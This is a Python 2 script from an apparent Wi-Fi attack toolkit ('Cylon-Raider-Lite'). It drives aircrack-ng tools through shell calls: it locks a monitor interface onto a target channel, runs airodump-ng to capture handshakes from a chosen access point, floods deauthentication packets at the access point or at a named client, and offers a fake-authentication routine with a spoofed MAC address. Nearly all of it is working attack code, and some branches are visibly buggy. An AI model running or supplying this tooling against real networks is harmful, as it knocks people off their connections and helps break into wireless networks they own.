#!/usr/bin/env python
# coding=UTF-8

import os
import socket
import operator
import sys
import time
import StringIO
import threading

cap_file_dir = '/root/Cylon-Raider-Lite/logs/'
capture_Interface = 'wlan1mon'

def deauth_target(attack_selected, capture_BSSID, capture_Channel, cap_file, capture_Interface):
    if attack_selected == "DIRECT":
        cmd_String = "aireplay-ng -0 0 -a {0} --ignore-negative-one {1}".format(capture_BSSID, capture_Interface)
        os.system(cmd_String)
    elif attack_selected == "CLIENT":
        client_mac = str(raw_input("Enter connected client MAC addr: "))
        cmd_String = "aireplay-ng -0 0 -c %s -a %s --ignore-negative-one %s" % (
            client_mac,
            capture_BSSID,
            capture_Interface
        )
        os.system(cmd_String)

def BUGGED_fake_auth_threading():
            # attack_selected = "DIRECT"
            # read_temp_files() # to retrieve the variables
            # def thread_1(capture_BSSID, capture_Channel, cap_file, capture_Interface):
            #     fake_auth_attack(capture_BSSID, capture_Channel, cap_file, capture_Interface)
            #     return
            # def thread_2(attack_selected, capture_BSSID, capture_Channel, cap_file, capture_Interface):
            #     deauth_target(attack_selected, capture_BSSID, capture_Channel, cap_file, capture_Interface)
            #     return
            #
            # x = threading.Thread(name='thread_1',target=thread_1)
            # y = threading.Thread(name='thread_2',target=thread_2)
            #
            # x.start()
            # y.start()
            #
            # if KeyboardInterrupt:
            #     x.terminate()
            #     y.terminate()
            # return
    return

def direct_or_client_deauth_question(capture_BSSID, capture_Channel, cap_file, capture_Interface):
    user_input = str(raw_input("Press 1 for DIRECT targeting, press 2 for CLIENT targeting for DEAUTH packets, press 3 to FAKE-AUTH: "))

    print """
    \t\t#0. Return to Main Menu
    \t\t#1. DIRECTLY target the ACCESS point
    \t\t#2. CLIENT TARGETING, and listen to handshake transmitted back to AP
    """
    #\t\t#3. FAKE-AUTH the AP, to provoke a response

    if user_input == "1":
        attack_selected = "DIRECT"
        deauth_target(attack_selected, capture_BSSID, capture_Channel, cap_file, capture_Interface)
    elif user_input == "2":
        attack_selected = "CLIENT"
        deauth_target(attack_selected, capture_BSSID, capture_Channel, cap_file, capture_Interface)
    elif user_input == "3":
        return
        #BUGGED_fake_auth_threading()
    elif user_input == "0":
        main()
    else:
        print 'You have entered a invalid option'
        direct_or_client_deauth_question(attack_selected, capture_BSSID, capture_Channel, cap_file, capture_Interface)
    return capture_BSSID, capture_Channel, cap_file, capture_Interface



def save_target_lock(capture_BSSID, capture_Channel, cap_file, capture_Interface):
    # temporarily saves files to a few text files for StringIO to pick it up for the other phase
    a = '/root/Cylon-Raider-Lite/logs/temp_BSSID'
    b = '/root/Cylon-Raider-Lite/logs/temp_Channel'
    c = '/root/Cylon-Raider-Lite/logs/temp_cap_file'
    d = '/root/Cylon-Raider-Lite/logs/temp_cap_interface'

    a = open(a,'w')
    a.write(capture_BSSID)
    a.close()

    b = open(b,'w')
    b.write(capture_Channel)
    b.close()

    c = open(c,'w')
    c.write(cap_file)
    c.close()

    d = open(d,'w')
    d.write(capture_Interface)
    d.close()

    print '[+] Your attack parameters have been temporarily saved for the Replay-Attack Portion in a new Window'
    start_targeted_capture(capture_BSSID, capture_Channel, cap_file, capture_Interface)

    return a,b,c,d

def start_targeted_capture(capture_BSSID, capture_Channel, cap_file, capture_Interface):
    print 'STATUS: Killing off current monitor mode session, to restart it and prevent channel-hop'
    cmd_String = "airmon-ng stop wlan1mon"
    os.system(cmd_String)
    time.sleep(1)
    print 'DEBUG: %s' % cmd_String
    cmd_String = "airmon-ng check kill"
    os.system(cmd_String)
    time.sleep(1)
    print 'DEBUG: %s' % cmd_String
    print 'STATUS: Restarting monitor interface on specific channel: %s' % capture_Channel
    cmd_String = "airmon-ng start wlan1 %s" % capture_Channel
    os.system(cmd_String)
    time.sleep(3)
    print 'DEBUG: %s' % cmd_String

    cmd_String = "airodump-ng --bssid {0} -a -c {1} --write {2} {3}".format(
        capture_BSSID,
        capture_Channel,
        cap_file,
        capture_Interface
    )
    print 'STATUS: Restarting airodump-ng'
    print 'DEBUG: %s' % cmd_String
    time.sleep(1)
    os.system(cmd_String)

    print 'STATUS: COMPLETE, targeted capture mode running'
    return capture_BSSID, capture_Channel, cap_file, capture_Interface

def gather_target_info():
    capture_BSSID = str(raw_input("Enter target AP MAC Addr (BSSID): "))
    capture_Channel = str(raw_input("Enter target AP CHANNEL: "))
    timestr = (time.strftime("%Y%m%d-%H%M%S"))
    cap_file = cap_file_dir + '_' + timestr + '_' + '.cap'
    save_target_lock(capture_BSSID, capture_Channel, cap_file, capture_Interface)
    return capture_BSSID, capture_Channel, cap_file, capture_Interface
# cannot mix targeting capture mode and overall capture mode, you must turn off the wifi card and restart it into targeted mode.

def read_temp_files():
    # read temp files
    # re-saves data in a new variable (because we are in a new window now, so we need to import the data)
    a = '/root/Cylon-Raider-Lite/logs/temp_BSSID'
    a = open(a,'r')
    a = a.read()
    capture_BSSID = a
    b = '/root/Cylon-Raider-Lite/logs/temp_Channel'
    b = open(b,'r')
    b = b.read()
    capture_Channel = b
    c = '/root/Cylon-Raider-Lite/logs/temp_cap_file'
    c = open(c,'r')
    c = c.read()
    cap_file = c
    d = '/root/Cylon-Raider-Lite/logs/temp_cap_interface'
    d = open(d,'r')
    d = d.read()
    capture_Interface = d

    print '[*] Attack parameters loaded, BSSID: %s, Channel: %s, Capture_File: %s, Capture_Interface: %s' % (
        capture_BSSID,
        capture_Channel,
        cap_file,
        capture_Interface
    )
    direct_or_client_deauth_question(capture_BSSID, capture_Channel, cap_file, capture_Interface) # needs to incorporate the read variables
    return capture_BSSID, capture_Channel, cap_file, capture_Interface

# cannot mix targeting capture mode and overall capture mode, you must turn off the wifi card and restart it into targeted mode.

def fake_auth_attack(capture_BSSID, capture_Channel, cap_file, capture_Interface): # aireplay-ng -a 84:1B:5E:B0:E4:8D -h <set src mac addr> -o 0 -Q --ignore-negative-one --fakeauth 1 wlan1mon

    # start_targeted_capture(capture_BSSID, capture_Channel, cap_file, capture_Interface)
    spoof_mac = str(raw_input("What MAC address are we spoofing?: "))
    cmd_String = "aireplay-ng -1 0 -a %s -h %s --ignore-negative-one wlan0" % (capture_BSSID, spoof_mac)
    os.system(cmd_String)
    print 'DEBUG: %s' % cmd_String
    return capture_BSSID, capture_Channel, cap_file, capture_Interface

def main():

    opt_List = [
        '\n\t#0. Return to Main Menu',
        '#1. Select Targeting Capture Mode',
        '\n### These options below require #1 to be performed FIRST ###\n',
        '#2. Start the de-auth replay attack'    ]

    print ("\n\t".join(opt_List))
    opt_Choice = str(raw_input("Enter a OPTION: "))
    if opt_Choice == "1":
        gather_target_info()
    elif opt_Choice == "2":
        # direct_or_client_deauth_question(capture_BSSID, capture_Channel, cap_file, capture_Interface)
        read_temp_files()
    elif opt_Choice == "0":
        os.system('clear')
        os.system('Cylon_Raider_Main.py')
    else:
        print 'ERROR: You have entered a invalid option'
        main()
    return
main()
